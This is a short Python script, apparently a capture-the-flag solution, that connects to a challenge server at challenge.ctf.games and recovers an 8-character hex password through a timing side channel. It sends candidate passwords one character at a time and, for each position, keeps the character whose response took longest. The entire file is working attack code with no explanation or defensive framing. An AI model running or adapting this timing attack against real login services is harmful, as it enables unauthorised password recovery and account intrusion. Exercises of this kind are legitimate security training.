# type: ignore
import time
import socket
import sys
import select

chars = [0]*8
seek = 0
timings = []

def getNext() -> str:
    global seek
    global timings
    if seek == 8:
        print("Password should have obtained")
        exit(0)
    if chars[seek] != 16:
        nextstr = ""
        for i in chars:
            nextstr += hex(i)[2]
        chars[seek] += 1
        return nextstr
    else:
        selected = timings.index(max(timings))
        print("Selected: {}".format(selected))
        chars[seek] = selected
        timings.clear()
        seek += 1
        return getNext()

def readFromSocket(soc: socket.socket) -> str:
    readBuffer, _, _ = select.select([soc], [], [], 0)
    if readBuffer:
        fromserver = soc.recv(2048).decode()
        return fromserver
    else:
        return ""

if __name__=="__main__":
    nextpass=""
    cSoc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    cSoc.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    cSoc.connect(('challenge.ctf.games',int(sys.argv[1])))
    start = time.time()
    while True:
        inLine = readFromSocket(cSoc)
        if inLine == "":
            continue
        diff = time.time()-start
        timings.append(diff)
        print("    Timing: {}, value: {}, Server: {}".format(diff, nextpass, inLine),end="")
        nextpass = getNext()
        cSoc.send((nextpass+'\n').encode())
        start = time.time()
